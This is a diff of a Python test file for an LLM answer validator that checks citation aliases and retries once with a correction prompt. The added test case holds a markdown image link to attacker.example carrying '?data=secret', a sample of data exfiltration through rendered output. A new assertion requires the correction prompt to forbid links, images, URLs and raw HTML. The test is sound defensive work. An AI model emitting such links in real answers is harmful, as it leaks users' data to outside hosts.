@@ -77,7 +77,15 @@ async def test_valid_answer_uses_only_selected_server_source_map() -> None:
     assert len(fake.calls) == 1
 
 
-@pytest.mark.parametrize("bad", ["Made up [S999]", "Missing citations", "Altered [S1 page=99]"])
+@pytest.mark.parametrize(
+    "bad",
+    [
+        "Made up [S999]",
+        "Missing citations",
+        "Altered [S1 page=99]",
+        "Leak ![chart](https://attacker.example/?data=secret) [S1]",
+    ],
+)
 async def test_exactly_one_correction_then_valid_or_fail_safe(bad: str) -> None:
     for second in ("Supported [S1]", "Still made up [S999]"):
         fake = FakeLLM([bad, second, "MUST NEVER CALL THIS [S1]"])
@@ -96,6 +104,7 @@ async def test_exactly_one_correction_then_valid_or_fail_safe(bad: str) -> None:
         )
         assert fake.calls[1][0][-1].role == "user"
         assert "only these exact source aliases: S1" in fake.calls[1][0][-1].content
+        assert "Do not include links, images, URLs, or raw HTML" in fake.calls[1][0][-1].content
         if second == "Supported [S1]":
             assert not result.abstained
             assert result.text == second
